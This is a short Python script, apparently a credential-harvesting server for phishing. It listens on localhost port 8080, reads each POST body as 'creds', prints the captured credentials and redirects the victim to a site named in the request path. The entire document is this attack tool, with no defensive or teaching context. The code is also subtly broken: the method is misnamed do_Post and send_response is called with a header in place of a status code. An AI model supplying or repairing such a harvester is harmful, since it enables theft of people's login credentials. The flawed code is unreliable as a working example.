from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer
from urllib.parse import  unquote

class CredRequestHandler( SimpleHTTPRequestHandler ) :          
    def do_Post(self):
        content_length = int(self.headers['content-Length'])    
        print(content_length)
        creds          = self.rfile.read(content_length).decode('utf-8')    
        print(creds)    
        site = self.path[1:]    
        self.send_response('Location' ,unquote(site))   
        self.end_headers()

server = TCPServer(('127.0.0.1' ,8080) ,CredRequestHandler)
server.serve_forever()
